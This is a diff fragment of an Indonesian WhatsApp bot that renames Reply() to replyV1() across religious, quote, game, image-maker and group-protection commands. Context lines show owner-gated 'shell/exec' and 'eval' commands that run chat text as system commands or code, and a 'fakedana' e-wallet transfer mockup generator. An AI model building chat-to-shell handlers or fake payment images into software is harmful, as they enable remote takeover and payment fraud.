  global.channels = loadChannels(); 
  
  if (global.channels.length === 0) 
- return Reply(` 
+ return replyV1(` 
 ╔══════════════════════════╗ 
  ❌ KESALAHAN ❌ 
 ╚══════════════════════════╝ 
@@ -30956,7 +30929,7 @@ case "jpmch": {
 Silakan daftarkan saluran terlebih dahulu. 
 `); 
 
- Reply(` 
+ replyV1(` 
 ╭─❰ PROCESSING MESSAGE ❱─╮ 
 📮 Mengirim Pesan Ke: 
  ➥ ${global.channels.length} Saluran
@@ -30974,7 +30947,7 @@ Silakan daftarkan saluran terlebih dahulu.
  await sleep(global.delayjpmch); // jeda tiap pengiriman 
  } 
  
- Reply(` 
+ replyV1(` 
 ╭─❰ RESULT SUMMARY ❱─╮ 
 📨 Pesan Terkirim: 
  ➥ ${total} Saluran 
@@ -30987,8 +30960,8 @@ Jeda : ${global.cooldown}
 break
 
 case "delidch": {
-    if (!isCreator) return Reply(mess.owner);
-    if (!text) return Reply("Harap masukkan nomor atau ID saluran yang ingin dihapus!");
+    if (!isCreator) return replyV1(mess.owner);
+    if (!text) return replyV1("Harap masukkan nomor atau ID saluran yang ingin dihapus!");
 
     global.channels = loadChannels();
 
@@ -30996,59 +30969,59 @@ case "delidch": {
         let index = parseInt(text.trim()) - 1;
 
         if (index < 0 || index >= global.channels.length) {
-            return Reply("Nomor urut tidak valid!");
+            return replyV1("Nomor urut tidak valid!");
         }
 
         let removed = global.channels.splice(index, 1);
         saveChannels(global.channels);
 
-        Reply(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
+        replyV1(`Berhasil menghapus ID Saluran: *${removed[0]}*`);
     } else {
         let channelId = text.trim();
 
         if (!global.channels.includes(channelId)) {
-            return Reply("ID Saluran tidak ditemukan!");
+            return replyV1("ID Saluran tidak ditemukan!");
         }
 
         global.channels = global.channels.filter((id) => id !== channelId);
         saveChannels(global.channels);
 
-        Reply(`Berhasil menghapus ID Saluran: ${channelId}`);
+        replyV1(`Berhasil menghapus ID Saluran: ${channelId}`);
     }
 }
 break
 
 case "addidch": {
- if (!isCreator) return Reply(!isOwner);
- if (!text) return Reply("Harap masukkan link saluran!");
+ if (!isCreator) return replyV1(!isOwner);
+ if (!text) return replyV1("Harap masukkan link saluran!");
 
  let channelLink = text.trim();
 
  if (!channelLink.includes("https://whatsapp.com/channel/")) {
- return Reply("Link saluran tidak valid! Harus berupa link WhatsApp (https://whatsapp.com/channel/...)");
+ return replyV1("Link saluran tidak valid! Harus berupa link WhatsApp (https://whatsapp.com/channel/...)");
  }
 
  let channelId = channelLink.split("https://whatsapp.com/channel/")[1];
- if (!channelId) return Reply("Gagal mengekstrak ID dari link saluran!");
+ if (!channelId) return replyV1("Gagal mengekstrak ID dari link saluran!");
 
  try {
  let res = await conn.newsletterMetadata("invite", channelId);
 
- if (!res.id) return Reply("ID saluran tidak valid!");
+ if (!res.id) return replyV1("ID saluran tidak valid!");
 
  global.channels = loadChannels();
 
  if (global.channels.includes(res.id)) {
- return Reply(`ID Saluran *${res.id}* sudah terdaftar!`);
+ return replyV1(`ID Saluran *${res.id}* sudah terdaftar!`);
  }
 
  global.channels.push(res.id);
  saveChannels(global.channels);
 
- Reply(`Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\nNama Saluran: ${res.name}`);
+ replyV1(`Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\nNama Saluran: ${res.name}`);
  } catch (e) {
  console.error(e);
- Reply("Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
+ replyV1("Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
  }
 }
 break
@@ -31056,8 +31029,8 @@ case 'terminal':
 case 'shell':
 case 'exec':
 case '$': {
-    if (!isCreator) return Reply(mess.owner)
-    if (!text?.trim()) return Reply(`Contoh:\n${prefix + command} ls -la`)
+    if (!isCreator) return replyV1(mess.owner)
+    if (!text?.trim()) return replyV1(`Contoh:\n${prefix + command} ls -la`)
     try {
         const { exec } = require('child_process')
         exec(text, {
@@ -31074,18 +31047,18 @@ case '$': {
             if (!sections.length) sections.push('✅ Perintah selesai tanpa output.')
             let output = sections.join('\n\n')
             if (output.length > 3500) output = `${output.slice(0, 3500)}\n… output dipotong agar aman dikirim.`
-            try { await Reply(output) }
+            try { await replyV1(output) }
             catch (sendError) { console.error('[TERMINAL REPLY]', sendError?.message || sendError) }
         })
     } catch (err) {
-        await Reply(`❌ Gagal menjalankan perintah terminal: ${String(err?.message || err).slice(0, 220)}`)
+        await replyV1(`❌ Gagal menjalankan perintah terminal: ${String(err?.message || err).slice(0, 220)}`)
     }
 }
 break
 case 'eval':
 case 'ev': {
-    if (!isCreator) return Reply(mess.owner)
-    if (!text) return Reply(`Contoh: ${prefix + command} 2 + 2`)
+    if (!isCreator) return replyV1(mess.owner)
+    if (!text) return replyV1(`Contoh: ${prefix + command} 2 + 2`)
     try {
         let result = await eval(text)
 
@@ -31094,9 +31067,9 @@ case 'ev': {
                 depth: 5
             })
         }
-        Reply(result)
+        replyV1(result)
     } catch (err) {
-        Reply(String(err))
+        replyV1(String(err))
     }
 }
 break
@@ -31110,10 +31083,10 @@ case 'asmaulhusna': {
                   return `Urutan: ${item.index}\nLatin: ${item.latin}\nArab: ${item.arabic}\nTerjemahan ID: ${item.translation_id}\nTerjemahan EN: ${item.translation_en}\n`
                 }).join('\n')
 
-                Reply(tks)
+                replyV1(tks)
               } catch (err) {
                 console.error(err)
-                Reply('Error cuy, coba lagi ntar!')
+                replyV1('Error cuy, coba lagi ntar!')
               }
             }
             break
@@ -31127,7 +31100,7 @@ case 'asmaulhusna': {
                 if (!text) {
                   let daftarNiat = 'DAFTAR NIAT SHOLAT\n\n' + niatSholat.map((item) => `- ${item.name}`).join('\n')
                   daftarNiat += '\n\nKetik .niatsholat [nama sholat] untuk melihat niat, contoh: .niatsholat subuh'
-                  Reply(daftarNiat)
+                  replyV1(daftarNiat)
                 } else {
                   let hasil = niatSholat.find((item) => item.name.toLowerCase().includes(text.toLowerCase()))
 
@@ -31136,14 +31109,14 @@ case 'asmaulhusna': {
                       `Arab: ${hasil.arabic}\n` +
                       `Latin: ${hasil.latin}\n` +
                       `Terjemahan: ${hasil.terjemahan}`
-                    Reply(tks)
+                    replyV1(tks)
                   } else {
-                    Reply('Niat sholat yang lu cari ga ketemu cuy. Cek lagi nama sholatnya!')
+                    replyV1('Niat sholat yang lu cari ga ketemu cuy. Cek lagi nama sholatnya!')
                   }
                 }
               } catch (err) {
                 console.error(err)
-                Reply('Error cuy, coba lagi ntar!')
+                replyV1('Error cuy, coba lagi ntar!')
               }
             }
             break
@@ -31151,7 +31124,7 @@ case 'asmaulhusna': {
             case 'surah': {
               try {
                 if (!text) {
-                  Reply('Ketik nomor surahnya! Contoh: .surah 1 buat ambil ayat-ayat dari Al-Fatihah')
+                  replyV1('Ketik nomor surahnya! Contoh: .surah 1 buat ambil ayat-ayat dari Al-Fatihah')
                   return
                 }
 
@@ -31166,13 +31139,13 @@ case 'asmaulhusna': {
                     `Terjemahan: ${ayat.indo}\n`
                   ).join('\n\n')
 
-                  Reply(surahText)
+                  replyV1(surahText)
                 } else {
-                  Reply('Gak ketemu, cek lagi nomor surahnya!')
+                  replyV1('Gak ketemu, cek lagi nomor surahnya!')
                 }
               } catch (err) {
                 console.error(err)
-                Reply('Terjadi kesalahan: ' + err)
+                replyV1('Terjadi kesalahan: ' + err)
               }
             }
             break
@@ -31186,7 +31159,7 @@ case 'asmaulhusna': {
                 if (!text) {
                   let listDoa = 'DAFTAR DOA\n\n' + daftarDoa.map((item) => `- ${item.doa}`).join('\n')
                   listDoa += '\n\nKetik .doa [nama doa] untuk melihat doa, contoh: .doa doa sebelum tidur'
-                  Reply(listDoa)
+                  replyV1(listDoa)
                 } else {
                   let hasil = daftarDoa.find((item) => item.doa.toLowerCase().includes(text.toLowerCase()))
 
@@ -31195,20 +31168,20 @@ case 'asmaulhusna': {
                       `Ayat: ${hasil.ayat}\n` +
                       `Latin: ${hasil.latin}\n` +
                       `Artinya: ${hasil.artinya}`
-                    Reply(tks)
+                    replyV1(tks)
                   } else {
-                    Reply('Doa yang lu cari ga ketemu cuy. Cek lagi nama doanya!')
+                    replyV1('Doa yang lu cari ga ketemu cuy. Cek lagi nama doanya!')
                   }
                 }
               } catch (err) {
                 console.error(err)
-                Reply('Error cuy, coba lagi ntar!')
+                replyV1('Error cuy, coba lagi ntar!')
               }
             }
             break
 
             case 'gislam': {
-              if (!text) return Reply('Mau cari tentang apa?')
+              if (!text) return replyV1('Mau cari tentang apa?')
               async function islam(query) {
                 try {
                   const response = await fetchJson(`https://artikel-islam.netlify.app/.netlify/functions/api/ms?page=1&s=${encodeURIComponent(query)}`)
@@ -31227,7 +31200,7 @@ case 'asmaulhusna': {
                 }
               }
               let lp = await islam(text)
-              Reply(lp)
+              replyV1(lp)
             }
             break
 
@@ -31248,7 +31221,7 @@ case 'asmaulhusna': {
               }
               let qe = 'Berikan satu kata-kata atau quotes Islamic random yang sangat memotivasi, dan menginspirasi, jawab langsung ke intinya!'
               let qo = await AI(qe)
-              Reply(qo.result)
+              replyV1(qo.result)
             }
             break
 
@@ -31269,46 +31242,46 @@ case 'asmaulhusna': {
               }
               let qe = 'Berikan satu kata-kata pantun Islamic random yang sangat memotivasi, dan menginspirasi, jawab langsung ke intinya!'
               let qo = await AI(qe)
-              Reply(qo.result)
+              replyV1(qo.result)
             }
             break
 //quotes menu
 case 'faktaunik': {
-      return Reply(funMenu.fact())
+      return replyV1(funMenu.fact())
     }
     break
     case 'katasenja': {
 const senja = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/katasenja.json`)
       const katasenja = await pickRandom(senja)
-      Reply(`${katasenja}`)
+      replyV1(`${katasenja}`)
     }
     break
     case 'katailham': {
 const ilham = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/katailham.json`)
       const katailham = await pickRandom(ilham)
-      Reply(`${katailham}`)
+      replyV1(`${katailham}`)
     }
     break
     case 'quotes': {
 const quot = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotes.json`)
       const quote = await pickRandom(quot)
-      Reply(`${quote.quotes}\n\nBy ${quote.author}`)
+      replyV1(`${quote.quotes}\n\nBy ${quote.author}`)
     }
     break
     case 'puisi': {
 const puis = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/puisi.json`)
       const puisi = await pickRandom(puis)
-      Reply(`${puisi}`)
+      replyV1(`${puisi}`)
     }
     break
     case 'pantun': {
-      return Reply(funMenu.makePantun())
+      return replyV1(funMenu.makePantun())
     }
     break
     case 'motivasi': {
 const motiv = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/motivasi.json`)
       const motivasi = await pickRandom(motiv)
-      Reply(`${motivasi}`)
+      replyV1(`${motivasi}`)
     }
     break
     //FUN MENU
@@ -31316,7 +31289,7 @@ case 'apakah':
 case 'bisakah':
 case 'kapankah': {
     const result = funMenu.questionAnswer(command, text)
-    return result.error ? Reply(result.error) : Reply(result.text)
+    return result.error ? replyV1(result.error) : replyV1(result.text)
 }
 break
 
@@ -31328,7 +31301,7 @@ break
               let subject = text.replace(/@[0-9]+/g, '').replace(/\s+/g, ' ').trim()
               if (targetJid) subject = await conn.getName(targetJid).catch(() => targetJid.split('@')[0])
               if (!subject) subject = pushname || m.sender.split('@')[0]
-              return Reply(funMenu.scoreCheck(command, subject))
+              return replyV1(funMenu.scoreCheck(command, subject))
             }
             break
 
@@ -31336,7 +31309,7 @@ break
             case 'ceksifat': {
               const targetJid = m.mentionedJid?.[0] || m.quoted?.sender || ''
               let subject = targetJid ? await conn.getName(targetJid).catch(() => targetJid.split('@')[0]) : (text || pushname)
-              return Reply(funMenu.traitReport(subject))
+              return replyV1(funMenu.traitReport(subject))
             }
             break
 
@@ -31345,7 +31318,7 @@ break
             case 'cekhobby': {
               const targetJid = m.mentionedJid?.[0] || m.quoted?.sender || ''
               let subject = targetJid ? await conn.getName(targetJid).catch(() => targetJid.split('@')[0]) : (text || pushname)
-              return Reply(funMenu.hobbyReport(subject))
+              return replyV1(funMenu.hobbyReport(subject))
             }
             break
 
@@ -31359,7 +31332,7 @@ break
                 const requestedTarget = tagged[0] || m.quoted?.sender || ''
                 const namedPair = funMenu.parsePairText(text)
                 if (namedPair) {
-                  return Reply(funMenu.scoreCompatibility(namedPair[0], namedPair[1]).text)
+                  return replyV1(funMenu.scoreCompatibility(namedPair[0], namedPair[1]).text)
                 }
                 if (tagged.length >= 2) {
                   const name1 = await getXeryuuContactNameSafe(conn, tagged[0])
@@ -31371,19 +31344,19 @@ break
                   const name2 = await getXeryuuContactNameSafe(conn, requestedTarget)
                   return sendCompatibilityMentionReply(name1, name2, m.sender, requestedTarget)
                 }
-                if (unique.length < 2) return Reply(`Gunakan ${prefix}jodoh Nama 1|Nama 2 di chat pribadi, tag dua orang, atau jalankan ${prefix}cekjodoh di grup.`)
+                if (unique.length < 2) return replyV1(`Gunakan ${prefix}jodoh Nama 1|Nama 2 di chat pribadi, tag dua orang, atau jalankan ${prefix}cekjodoh di grup.`)
                 const target = unique.find(jid => requestedTarget && sameParticipantIdentity(jid, requestedTarget)) ||
                   unique.find(jid => sameParticipantIdentity(jid, m.sender)) || m.sender
                 let candidates = unique.filter(jid => !sameParticipantIdentity(jid, target))
                 if (!candidates.length) candidates = unique.filter(jid => !sameParticipantIdentity(jid, m.sender))
-                if (!candidates.length) return Reply('❌ Belum ada anggota lain untuk dipasangkan.')
+                if (!candidates.length) return replyV1('❌ Belum ada anggota lain untuk dipasangkan.')
                 const partner = funMenu.pickRandom(candidates)
                 const name1 = await getXeryuuContactNameSafe(conn, target)
                 const name2 = await getXeryuuContactNameSafe(conn, partner)
                 return sendCompatibilityMentionReply(name1, name2, target, partner)
               } catch (err) {
                 console.error('[CEKJODOH]', err?.stack || err)
-                return Reply('❌ Cek jodoh gagal. Coba lagi sebentar, ya.')
+                return replyV1('❌ Cek jodoh gagal. Coba lagi sebentar, ya.')
               }
             }
             break
@@ -31393,14 +31366,14 @@ break
 // ===============================
 case 'bagaimanakah': {
     const result = funMenu.questionAnswer(command, text)
-    return result.error ? Reply(result.error) : Reply(result.text)
+    return result.error ? replyV1(result.error) : replyV1(result.text)
 }
 break
 case 'wangy':
 case 'rate':
 case 'top': {
     const subject = text || pushname || m.sender.split('@')[0]
-    return Reply(funMenu.scoreCheck(command, subject))
+    return replyV1(funMenu.scoreCheck(command, subject))
 }
 break
 case 'jadian':
@@ -31414,15 +31387,15 @@ case 'cekpasangan': {
     const targetJid = normalize(m.mentionedJid?.[0] || m.quoted?.sender || '')
     const me = normalize(m.sender)
     if (command === 'jadian') {
-        if (!targetJid) return Reply(`Tag/reply orang yang mau kamu ajak jadian.\nContoh: ${prefix}jadian @628xxxx`)
-        if (targetJid === me) return Reply('❌ Tidak bisa jadian dengan diri sendiri 😭')
+        if (!targetJid) return replyV1(`Tag/reply orang yang mau kamu ajak jadian.\nContoh: ${prefix}jadian @628xxxx`)
+        if (targetJid === me) return replyV1('❌ Tidak bisa jadian dengan diri sendiri 😭')
         proposals[targetJid] = { from: me, at: Date.now() }
         saveDB(global.db)
         return conn.sendMessage(m.chat, { text: `💌 @${me.split('@')[0]} mengajak @${targetJid.split('@')[0]} jadian.\n\nBalas ${prefix}terima atau ${prefix}tolak.`, mentions: [me, targetJid] }, { quoted: m })
     }
     if (command === 'terima') {
         const proposal = proposals[me]
-        if (!proposal) return Reply(`❌ Tidak ada ajakan jadian untuk kamu.`)
+        if (!proposal) return replyV1(`❌ Tidak ada ajakan jadian untuk kamu.`)
         relations[me] = proposal.from
         relations[proposal.from] = me
         delete proposals[me]
@@ -31431,14 +31404,14 @@ case 'cekpasangan': {
     }
     if (command === 'tolak') {
         const proposal = proposals[me]
-        if (!proposal) return Reply('❌ Tidak ada ajakan jadian yang pending.')
+        if (!proposal) return replyV1('❌ Tidak ada ajakan jadian yang pending.')
         delete proposals[me]
         saveDB(global.db)
         return conn.sendMessage(m.chat, { text: `💔 Ajakan dari @${proposal.from.split('@')[0]} ditolak.`, mentions: [proposal.from] }, { quoted: m })
     }
     if (command === 'putus') {
         const partner = relations[me]
-        if (!partner) return Reply('❌ Kamu belum punya pasangan di bot.')
+        if (!partner) return replyV1('❌ Kamu belum punya pasangan di bot.')
         delete relations[me]
         delete relations[partner]
         saveDB(global.db)
@@ -31446,7 +31419,7 @@ case 'cekpasangan': {
     }
     if (command === 'cekpasangan') {
         const textPair = funMenu.parsePairText(text)
-        if (textPair) return Reply(funMenu.scoreCompatibility(textPair[0], textPair[1]).text)
+        if (textPair) return replyV1(funMenu.scoreCompatibility(textPair[0], textPair[1]).text)
         const tagged = Array.isArray(m.mentionedJid) ? m.mentionedJid.filter(Boolean) : []
         const pairJids = tagged.length >= 2
             ? tagged.slice(0, 2).map(normalize)
@@ -31474,7 +31447,7 @@ case 'cekpasangan': {
                 return sendCompatibilityMentionReply(name1, name2, me, chosen)
             }
         }
-        return Reply(`Cara pakai: ${prefix}cekpasangan @orang1 @orang2\nAtau: ${prefix}cekpasangan Nama 1|Nama 2`)
+        return replyV1(`Cara pakai: ${prefix}cekpasangan @orang1 @orang2\nAtau: ${prefix}cekpasangan Nama 1|Nama 2`)
     }
     const partner = relations[me]
     if (!partner) return conn.sendMessage(m.chat, { text: `💔 @${me.split('@')[0]} masih jomblo.`, mentions: [me] }, { quoted: m })
@@ -31523,7 +31496,7 @@ case 'bego':
             case 'cacat':
             case 'yatim':
             case 'piatu': {
-              if (!m.isGroup) return Reply(mess.group || 'Command ini hanya bisa digunakan di grup.')
+              if (!m.isGroup) return replyV1(mess.group || 'Command ini hanya bisa digunakan di grup.')
               let member = participants.map(u => u.jid).filter(v => v !== conn.user.jid)
               let org = member[Math.floor(Math.random() * member.length)];
               conn.sendMessage(m.chat, {
@@ -31573,7 +31546,7 @@ case 'bego':
 						let ran = getRandom('.mp3')
 						exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
 							fs.unlinkSync(media)
-							if (err) return Reply(err)
+							if (err) return replyV1(err)
 							let buff = fs.readFileSync(ran)
 							conn.sendMessage(m.chat, {
 								audio: buff,
@@ -31583,7 +31556,7 @@ case 'bego':
 							})
 							fs.unlinkSync(ran)
 						})
-					} else Reply(`Balas audio yang ingin diubah dengan caption *${cmd}*`)
+					} else replyV1(`Balas audio yang ingin diubah dengan caption *${cmd}*`)
 				} catch (error) {
 					 
 				}
@@ -31671,7 +31644,7 @@ case 'bego':
     case 'yulibocil':
     case 'yumeko': {
 
-return Reply("Loading 🔁")
+return replyV1("Loading 🔁")
       let heyy
       if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/akiyama.json')
       if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Leoo7z/Image-Source/main/image/ana.json')
@@ -31795,11 +31768,11 @@ case 'fakestory': {
     const q = m.quoted ? m.quoted : m
     const mime = String((q.msg || q).mimetype || '')
     if (!/^image\//i.test(mime)) {
-        return Reply(`✨ *FAKE STORY*\n\n1. Kirim atau reply foto.\n2. Gunakan: ${prefix}fakestory username|caption\n\nContoh: reply gambar lalu kirim\n${prefix}fakestory yuusuke|hari yang indah`)
+        return replyV1(`✨ *FAKE STORY*\n\n1. Kirim atau reply foto.\n2. Gunakan: ${prefix}fakestory username|caption\n\nContoh: reply gambar lalu kirim\n${prefix}fakestory yuusuke|hari yang indah`)
     }
     const input = String(text || '').trim()
     const divider = input.indexOf('|')
-    if (divider < 0) return Reply(`❌ Format harus username|caption.\nContoh: ${prefix}fakestory yuusuke|hari yang indah`)
+    if (divider < 0) return replyV1(`❌ Format harus username|caption.\nContoh: ${prefix}fakestory yuusuke|hari yang indah`)
     const username = input.slice(0, divider).trim().slice(0, 32) || 'Anonymous'
     const captionText = input.slice(divider + 1).trim().slice(0, 300) || '-'
     try {
@@ -31815,7 +31788,7 @@ case 'fakestory': {
     } catch (error) {
         console.error('[FAKESTORY ERROR]', error?.stack || error)
         await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {})
-        return Reply(`❌ FakeStory gagal: ${error?.message || error}`)
+        return replyV1(`❌ FakeStory gagal: ${error?.message || error}`)
     }
 }
 break
@@ -31824,11 +31797,11 @@ case 'fakeff':
 case 'lobyff':
 case 'lobbyff': {
     const input = String(text || '').trim()
-    if (!input.includes('|')) return Reply(`🎮 *FREE FIRE LOBBY MOCKUP*\n\nContoh: ${prefix}fakeff 1|Xnalz\nContoh random: ${prefix}fakeff random|Xnalz\nTemplate tersedia: 1–22 atau random.`)
+    if (!input.includes('|')) return replyV1(`🎮 *FREE FIRE LOBBY MOCKUP*\n\nContoh: ${prefix}fakeff 1|Xnalz\nContoh random: ${prefix}fakeff random|Xnalz\nTemplate tersedia: 1–22 atau random.`)
     const divider = input.indexOf('|')
     const template = input.slice(0, divider).trim()
     const playerName = input.slice(divider + 1).trim()
-    if (!playerName) return Reply(`Nama pemain belum diisi. Contoh: ${prefix}fakeff 1|Xnalz`)
+    if (!playerName) return replyV1(`Nama pemain belum diisi. Contoh: ${prefix}fakeff 1|Xnalz`)
     try {
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {})
         const result = await furinaV18Features.createFakeFF(template, playerName)
@@ -31840,7 +31813,7 @@ case 'lobbyff': {
     } catch (error) {
         console.error('[FAKEFF ERROR]', error?.stack || error)
         await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {})
-        return Reply(`❌ FakeFF gagal: ${error?.message || error}`)
+        return replyV1(`❌ FakeFF gagal: ${error?.message || error}`)
     }
 }
 break
@@ -31850,7 +31823,7 @@ case 'fakelobby':
 case 'fakelobbyml': {
     const q = m.quoted ? m.quoted : m
     const mime = String((q.msg || q).mimetype || '')
-    if (!/^image\//i.test(mime)) return Reply(`🎮 *FAKE ML LOBBY MOCKUP*\n\nReply sebuah foto lalu gunakan:\n${prefix}fakeml nickname\n\nContoh: ${prefix}fakeml Xnalz`)
+    if (!/^image\//i.test(mime)) return replyV1(`🎮 *FAKE ML LOBBY MOCKUP*\n\nReply sebuah foto lalu gunakan:\n${prefix}fakeml nickname\n\nContoh: ${prefix}fakeml Xnalz`)
     const nickname = String(text || '').trim().slice(0, 20) || 'Xeryuu'
     try {
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {})
@@ -31864,14 +31837,14 @@ case 'fakelobbyml': {
     } catch (error) {
         console.error('[FAKEML ERROR]', error?.stack || error)
         await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {})
-        return Reply(`❌ FakeML gagal: ${error?.message || error}`)
+        return replyV1(`❌ FakeML gagal: ${error?.message || error}`)
     }
 }
 break
 
 case 'fakedana': {
     const nominal = String(text || '').trim()
-    if (!nominal) return Reply(`💳 *DANA MOCKUP / SIMULASI*\n\nContoh: ${prefix}fakedana 150000\n\nHasil diberi watermark SIMULASI dan bukan bukti transfer/pembayaran.`)
+    if (!nominal) return replyV1(`💳 *DANA MOCKUP / SIMULASI*\n\nContoh: ${prefix}fakedana 150000\n\nHasil diberi watermark SIMULASI dan bukan bukti transfer/pembayaran.`)
     try {
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {})
         const result = await furinaV18Features.createFakeDana(nominal)
@@ -31883,7 +31856,7 @@ case 'fakedana': {
     } catch (error) {
         console.error('[FAKEDANA ERROR]', error?.stack || error)
         await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {})
-        return Reply(`❌ Mockup DANA gagal dibuat: ${error?.message || error}`)
+        return replyV1(`❌ Mockup DANA gagal dibuat: ${error?.message || error}`)
     }
 }
 break
@@ -31891,7 +31864,7 @@ break
 case 'fakecallwa':
 case 'fakecall': {
 
-if (!text) return Reply(`Contoh: ${cmd} Marin | 19.00`)
+if (!text) return replyV1(`Contoh: ${cmd} Marin | 19.00`)
   let [l, r] = text.split`|`
 if (!l) l = ''
 if (!r) r = ''
@@ -31902,7 +31875,7 @@ break
 case 'carboncodeimage':
 case 'carbonify': {
 
-if (!text) return Reply(`Contoh: ${cmd} Lyrra`)
+if (!text) return replyV1(`Contoh: ${cmd} Lyrra`)
   
   await conn.sendMessage(m.chat, {image: {url: `https://api.zenzxz.my.id/api/maker/carbonify?input=${text}&title=${pushname}` }, caption: "" }, {quoted: m})
 }
@@ -31910,7 +31883,7 @@ break
 case 'textonimage':
 case 'animegirl': {
 
-if (!text) return Reply(`Contoh: ${cmd} Lyrra`)
+if (!text) return replyV1(`Contoh: ${cmd} Lyrra`)
   
   await conn.sendMessage(m.chat, {image: {url: `https://api.zenzxz.my.id/api/maker/animegirl/image?text=${text}` }, caption: "" }, {quoted: m})
 }
@@ -31919,7 +31892,7 @@ break
 case 'bratfoto':
 case 'bratgenerator': {
 
-if (!text) return Reply(`Contoh: ${cmd} beautiful girl with handsome man`)
+if (!text) return replyV1(`Contoh: ${cmd} beautiful girl with handsome man`)
     
     await conn.sendMessage(m.chat, {image: {url: `https://aqul-brat.hf.space/?text=${text}` }, caption: "" }, {quoted: m})
 }
@@ -31927,7 +31900,7 @@ break
 case 'pakustad':
 case 'pak-ustad': {
 
-if (!text) return Reply(`Contoh: ${cmd} kenapa xnalz ganteng`)
+if (!text) return replyV1(`Contoh: ${cmd} kenapa xnalz ganteng`)
     
     await conn.sendMessage(m.chat, {image: {url: `https://api.taka.my.id/tanya-ustad?quest=${text}` }, caption: "" }, {quoted: m})
 }
@@ -31935,7 +31908,7 @@ break
 case 'nglgenerator':
 case 'ngl': {
 
-if (!text) return Reply(`Contoh: ${cmd} beautiful girl with handsome man`)
+if (!text) return replyV1(`Contoh: ${cmd} beautiful girl with handsome man`)
     
     await conn.sendMessage(m.chat, {image: {url: `https://api.taka.my.id/ngl?text=${text}` }, caption: "" }, {quoted: m})
 }
@@ -31943,8 +31916,8 @@ break
     case 'attp': {
 
 const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
-//if (!m.isGroup) return Reply('*`maybee` fitur ini hanya untuk di grup*')
- if (!quo) return Reply("masukan teksnya woii");
+//if (!m.isGroup) return replyV1('*`maybee` fitur ini hanya untuk di grup*')
+ if (!quo) return replyV1("masukan teksnya woii");
  
 async function brat(text) {
  try {
@@ -31981,8 +31954,8 @@ case 'pak-ustad2':
 case 'pakustad2': {
 
 const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
-//if (!m.isGroup) return Reply('*`maybee` fitur ini hanya untuk di grup*')
- if (!quo) return Reply("masukan teksnya woii");
+//if (!m.isGroup) return replyV1('*`maybee` fitur ini hanya untuk di grup*')
+ if (!quo) return replyV1("masukan teksnya woii");
  
 async function brat(text) {
  try {
@@ -32018,11 +31991,11 @@ break
 //~~~~~~~~~~~~~PENJAGA GRUP~~~~~~~~~~~~~~~~~//
 case 'antipromosi': {
     if (!m.isGroup) {
-        return Reply(mess.group)
+        return replyV1(mess.group)
     }
 
     if (!isAdmins && !isCreator) {
-        return Reply(mess.admin)
+        return replyV1(mess.admin)
     }
 
     const option = String(
@@ -32034,7 +32007,7 @@ case 'antipromosi': {
     if (
         !['on', 'off'].includes(option)
     ) {
-        return Reply(
+        return replyV1(
 `🛡️ ANTI PROMOSI
 
 Fitur ini mendeteksi:
@@ -32071,7 +32044,7 @@ ${prefix}antipromosi off`
         clearGroupChallenges(m.chat)
     }
 
-    return Reply(
+    return replyV1(
         option === 'on'
             ? `🛡️ ANTI PROMOSI AKTIF
 
@@ -32091,8 +32064,8 @@ Jika ada anggota mengirim link promosi:
 }
 break
 case 'antibot': {
-    if (!m.isGroup) return Reply(mess.group)
-    if (!isAdmins && !isCreator) return Reply(mess.admin)
+    if (!m.isGroup) return replyV1(mess.group)
+    if (!isAdmins && !isCreator) return replyV1(mess.admin)
 
     if (!global.db.groups) global.db.groups = {}
     const group = global.db.groups[m.chat] ||= {}
@@ -32102,7 +32075,7 @@ case 'antibot': {
 
     const [option = 'status', value] = String(text || '').trim().toLowerCase().split(/\s+/)
     if (!['on', 'off', 'status', 'timeout', 'verify', 'challenge'].includes(option)) {
-        return Reply(
+        return replyV1(
             `╭━━〔 🛡️ ANTI-BOT VERIFIKASI 〕━━╮\n` +
             `│ Status  : ${group.antibot === true ? 'AKTIF' : 'NONAKTIF'}\n` +
             `│ Timeout : ${Number(group.antibotTimeout)} detik\n` +
@@ -32117,34 +32090,34 @@ case 'antibot': {
 
     if (option === 'verify' || option === 'challenge') {
         const targetJid = m.mentionedJid?.[0] || m.quoted?.sender || ''
-        if (!targetJid) return Reply(`Tag atau reply anggota yang ingin diverifikasi. Contoh: ${prefix}antibot verify @628xxxx`)
+        if (!targetJid) return replyV1(`Tag atau reply anggota yang ingin diverifikasi. Contoh: ${prefix}antibot verify @628xxxx`)
         try {
             const started = await antiBotService.startChallenge(conn, m.chat, targetJid, {
                 timeoutMs: Number(group.antibotTimeout || 60) * 1000,
                 metadata: m.metadata
             })
-            return Reply(started
+            return replyV1(started
                 ? `🛡️ Tantangan verifikasi dikirim kepada @${targetJid.split('@')[0]}.`
                 : '⚠️ Tantangan tidak dapat dimulai. Pastikan anggota masih berada di grup dan bukan admin grup.',
                 { mentions: [targetJid] }
             )
         } catch (error) {
             console.error('[ANTIBOT MANUAL VERIFY]', error?.stack || error)
-            return Reply('❌ Gagal memulai verifikasi. Coba lagi setelah memastikan koneksi bot stabil.')
